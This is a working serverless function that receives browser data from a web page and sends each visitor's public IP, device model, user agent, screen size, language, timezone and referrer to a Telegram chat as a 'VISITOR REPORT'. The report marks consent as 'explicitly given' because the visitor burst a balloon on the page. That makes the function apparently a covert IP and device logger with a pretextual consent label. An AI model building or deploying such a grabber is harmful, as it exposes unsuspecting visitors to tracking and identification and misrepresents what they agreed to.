exports.handler = async (event) => {
  const reply = (statusCode, body) => ({
    statusCode,
    headers: {"Content-Type":"application/json","Cache-Control":"no-store"},
    body: JSON.stringify(body)
  });

  if (event.httpMethod !== "POST") return reply(405, {ok:false, error:"Method not allowed"});

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return reply(500, {ok:false, error:"Missing Telegram environment variables"});
  }

  let d;
  try { d = JSON.parse(event.body || "{}"); }
  catch (_) { return reply(400, {ok:false, error:"Invalid JSON"}); }

  if (d.type !== "visitor_diagnostics") {
    return reply(400, {ok:false, error:"Unsupported telemetry type"});
  }

  const h = Object.fromEntries(
    Object.entries(event.headers || {}).map(([k,v]) => [k.toLowerCase(), v])
  );
  const ip =
    h["x-nf-client-connection-ip"] ||
    h["client-ip"] ||
    String(h["x-forwarded-for"] || "").split(",")[0].trim() ||
    "unavailable";

  const dh = d.deviceHints || {};
  const brands = Array.isArray(dh.brands)
    ? dh.brands.map(x => x.brand).filter(Boolean).join(", ")
    : "unavailable";

  const s = d.screen || {};
  const v = d.viewport || {};

  const text = [
    "╔══════════════════════════════╗",
    "║      💌 VISITOR REPORT      ║",
    "╚══════════════════════════════╝",
    "",
    "CONSENT",
    "• Source: balloon interaction",
    "• Consent: explicitly given",
    `• Time: ${d.timestamp || new Date().toISOString()}`,
    "",
    "NETWORK",
    `• Public IP: ${ip}`,
    `• Provider: ${d.networkProvider || "not exposed by browser"}`,
    "",
    "DEVICE / BROWSER",
    `• Model: ${dh.model || "not exposed"}`,
    `• Platform: ${dh.platform || d.platform || "unavailable"}`,
    `• Mobile: ${dh.mobile === true ? "Yes" : dh.mobile === false ? "No" : "Unknown"}`,
    `• Brands: ${brands}`,
    `• User-Agent: ${String(d.userAgent || h["user-agent"] || "unavailable").slice(0, 450)}`,
    "",
    "DISPLAY",
    `• Screen: ${s.width || "?"} × ${s.height || "?"}`,
    `• Pixel ratio: ${s.pixelRatio || "?"}`,
    `• Viewport: ${v.width || "?"} × ${v.height || "?"}`,
    `• Touch points: ${d.touchPoints ?? "?"}`,
    "",
    "BROWSER",
    `• Language: ${d.language || "unavailable"}`,
    `• Timezone: ${d.timezone || "unavailable"}`,
    `• Referrer: ${d.referrer || "direct / unavailable"}`,
    `• Page: ${String(d.page || "").slice(0, 450)}`,
    "",
    "LOCATION",
    "• GPS: not requested (no browser location popup)",
    "",
    "INTERACTION",
    "• balloon_burst_consent",
    "",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");

  try {
    const tg = await fetch(
      `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage`,
      {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
          chat_id: chatId,
          text,
          disable_web_page_preview:true
        })
      }
    );

    const result = await tg.json().catch(() => ({}));
    if (!tg.ok || !result.ok) {
      return reply(502, {ok:false, error: result.description || "Telegram rejected message"});
    }
    return reply(200, {ok:true});
  } catch (_) {
    return reply(502, {ok:false, error:"Telegram request failed"});
  }
};
